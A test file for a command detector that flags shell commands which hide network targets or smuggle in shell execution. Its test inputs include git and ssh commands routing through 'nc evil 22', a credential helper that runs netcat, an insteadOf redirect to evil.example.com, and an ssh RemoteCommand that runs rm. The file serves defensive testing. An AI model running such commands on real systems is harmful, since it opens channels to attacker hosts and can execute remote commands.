		it("flags ssh -F pointing at a non-default config file", () => {
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -F /tmp/attacker.ssh_config user@github.com",
				),
			).toBe("ssh -F /tmp/attacker.ssh_config user@github.com");
			expect(
				findOpaqueNetworkShellCommand(
					"ssh -F/tmp/attacker.cfg user@github.com",
				),
			).toBe("ssh -F/tmp/attacker.cfg user@github.com");
		});

		it("flags git -c config keys that resolve to a shell command", () => {
			expect(
				findOpaqueNetworkShellCommand(
					"git -c core.sshCommand='ssh -o ProxyCommand=nc evil 22' clone git@github.com:o/r",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git -C /tmp/repo -c core.sshCommand='ssh -o ProxyCommand=nc evil 22' clone git@github.com:o/r",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git -c protocol.ext.allow=always fetch ext::sh -c 'nc evil 22'",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git -c credential.helper='!nc evil 22' clone https://github.com/o/r",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					'git -c url."https://evil.example.com/".insteadOf=https://github.com/ clone https://github.com/o/r',
				),
			).not.toBeNull();
		});

		it("flags git --config-env keys that resolve to a shell command", () => {
			// `--config-env=KEY=ENVVAR` and `--config-env KEY=ENVVAR` are
			// the env-indirected twins of `-c KEY=value`; the same KEY
			// allowlist applies.
			expect(
				findOpaqueNetworkShellCommand(
					"git --config-env=core.sshCommand=EVIL_SSH clone git@github.com:o/r",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git --config-env core.sshCommand=EVIL_SSH clone git@github.com:o/r",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git --config-env=credential.helper=EVIL_HELPER clone https://github.com/o/r",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					'git --config-env=url."https://evil.example.com/".insteadOf=EVIL clone https://github.com/o/r',
				),
			).not.toBeNull();
		});

		it("flags git clone --config keys that resolve to a shell command", () => {
			for (const command of [
				"git clone --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
				"git clone --config=credential.helper='!nc evil 22' https://github.com/o/r",
				"git clone --depth 1 --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
				"git clone --branch main --config=credential.helper='!nc evil 22' https://github.com/o/r",
				"git clone --origin upstream --upload-pack /usr/bin/git-upload-pack --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
				"git clone -b main -o upstream -u /usr/bin/git-upload-pack --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
				"git clone --depth 1 --config-env core.sshCommand=EVIL_SSH git@github.com:o/r",
				"git clone --branch main --config-env=credential.helper=EVIL_HELPER https://github.com/o/r",
				"git clone -b main -o upstream -u /usr/bin/git-upload-pack --config-env core.sshCommand=EVIL_SSH git@github.com:o/r",
			]) {
				expect(findOpaqueNetworkShellCommand(command), command).not.toBeNull();
			}
		});

		it("unwraps script(1) so opaque ssh options inside its -c command are flagged", () => {
			// `script -qc 'ssh -o ProxyCommand=…'` runs the wrapped command in
			// a subshell. The opaque-options matcher must reach through the
			// `script` wrapper just like it does through `bash -c`.
			expect(
				findOpaqueNetworkShellCommand(
					"script -qc 'ssh -o ProxyCommand=nc evil 22' /tmp/log",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"script -q -c 'ssh -o RemoteCommand=rm user@host' /dev/null",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"script --command 'ssh -o ProxyCommand=evil host' /dev/null",
				),
			).not.toBeNull();
		});

		it("flags opaque ssh options inside an xargs -I template", () => {
			// `xargs -I {} ssh -o ProxyCommand=… 127.0.0.1` instantiates the
			// template per stdin line, but the static option name is still
			// visible to the matcher.
			expect(
				findOpaqueNetworkShellCommand(
					"xargs -I {} ssh -o ProxyCommand=nc evil 22 127.0.0.1",
				),
			).not.toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"xargs -I{} ssh -o ProxyCommand=nc evil 22 127.0.0.1",
				),
			).not.toBeNull();
		});

		it("treats Windows drive paths as local scp copies, not remote hosts", () => {
			// `scp C:\src\file.txt C:\dst\` is a local copy between drive
			// paths. The old `host:path` matcher would parse `C` as a remote
			// host because it contains a colon.
			expect(
				findOpaqueNetworkShellCommand(
					"scp C:\\src\\file.txt C:\\dst\\file.txt",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("scp C:/src/file.txt C:/dst/file.txt"),
			).toBeNull();
		});

		it("leaves benign git -c keys alone", () => {
			expect(
				findOpaqueNetworkShellCommand(
					"git -c user.email=me@example.com clone https://github.com/o/r",
				),
			).toBeNull();
			expect(
				findOpaqueNetworkShellCommand(
					"git -c color.ui=always clone https://github.com/o/r",
				),
			).toBeNull();
		});

		it("flags opaque targets inside command substitutions", () => {
			expect(findOpaqueNetworkShellCommand("echo $(curl $TARGET)")).toBe(
				"curl $TARGET",
			);
			expect(
				findOpaqueNetworkShellCommand("curl https://example.com $TARGET"),
			).toBe("curl https://example.com $TARGET");
		});

		it("flags shell -c argv variants whose command body expands at runtime", () => {
			expect(findOpaqueNetworkShellCommand('bash -ce "$CMD"')).toBe(
				"bash -ce $CMD",
			);
			expect(findOpaqueNetworkShellCommand('bash --command="$CMD"')).toBe(
				"bash --command=$CMD",
			);
		});

		it("flags opaque git config URL assignments", () => {
			expect(
				findOpaqueNetworkShellCommand("git config remote.origin.url $REMOTE"),
			).toBe("git config remote.origin.url $REMOTE");
			expect(
				findOpaqueNetworkShellCommand(
					'git config url."$REMOTE".insteadOf https://github.com/',
				),
			).toBe("git config url.$REMOTE.insteadOf https://github.com/");
		});

		it("flags opaque targets behind xargs and find exec prefixes", () => {
			expect(findOpaqueNetworkShellCommand("xargs curl $TARGET")).toBe(
				"curl $TARGET",
			);
			expect(
				findOpaqueNetworkShellCommand("find . -exec curl $TARGET \\;"),
			).toBe("curl $TARGET");
		});

		it("flags opaque targets inside subshell groups", () => {
			expect(findOpaqueNetworkShellCommand("( curl $TARGET )")).toBe(
				"curl $TARGET",
			);
		});

		it("flags opaque targets inside process substitutions", () => {
			expect(findOpaqueNetworkShellCommand("cat <(curl $TARGET)")).toBe(
				"curl $TARGET",
			);
		});

		it("ignores local git clone targets", () => {
			expect(findOpaqueNetworkShellCommand("git clone ./repo")).toBeNull();
			expect(findOpaqueNetworkShellCommand("git clone /tmp/repo")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git clone file:///tmp/repo"),
			).toBeNull();
		});

		it("ignores local git archive commands without remotes", () => {
			expect(findOpaqueNetworkShellCommand("git archive HEAD")).toBeNull();
			expect(
				findOpaqueNetworkShellCommand("git archive --format=tar v1.0"),
			).toBeNull();
		});
	});
});

describe("extractAllUrls", () => {
	it("combines value and shell command extraction", () => {
		const result = extractAllUrls(
			{ url: "https://one.com" },
			"curl https://two.com",
		);
		expect(result).toContain("https://one.com");
		expect(result).toContain("https://two.com");
	});

	it("deduplicates URLs", () => {
		const result = extractAllUrls(
			{ url: "https://example.com" },
			"curl https://example.com",
		);
		expect(result).toEqual(["https://example.com"]);
	});

	it("works without shell command", () => {
		const result = extractAllUrls({ url: "https://example.com" });
		expect(result).toEqual(["https://example.com"]);
	});

	it("works with only shell command", () => {
		const result = extractAllUrls({}, "curl https://example.com");
		expect(result).toEqual(["https://example.com"]);
	});
});
